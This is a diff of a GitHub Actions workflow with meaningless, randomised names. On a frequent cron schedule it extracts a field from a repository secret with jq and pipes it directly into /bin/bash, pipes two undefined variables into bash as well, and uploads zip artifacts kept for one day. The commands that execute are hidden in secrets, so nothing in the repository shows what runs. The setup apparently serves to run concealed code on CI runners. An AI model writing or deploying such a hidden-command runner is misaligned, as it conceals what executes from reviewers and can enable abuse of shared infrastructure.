@@ -1,19 +1,25 @@
 name: guokenushi
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '53 3/6 * * *'
-jobs:  # 7906
+    - cron: '18 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: guokenushi
         env:
-          z47: ${{ secrets.z47 }}
+          uszl67: ${{ secrets.uszl67 }}
         run: |
-          echo $z47 | jq -r .zkq934 | /bin/bash
-          echo $idnl09967 | jq -r .fubc06322 | /bin/bash
+          printf '%s' "$uszl67" | jq -r .oqxjm2 | /bin/bash
+          echo $qmakl965 | jq -r .ky14 | /bin/bash
+          echo $a72376 | jq -r .xpogt94 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: iPJi8cGX
+          path: "*.zip"
+          retention-days: 1
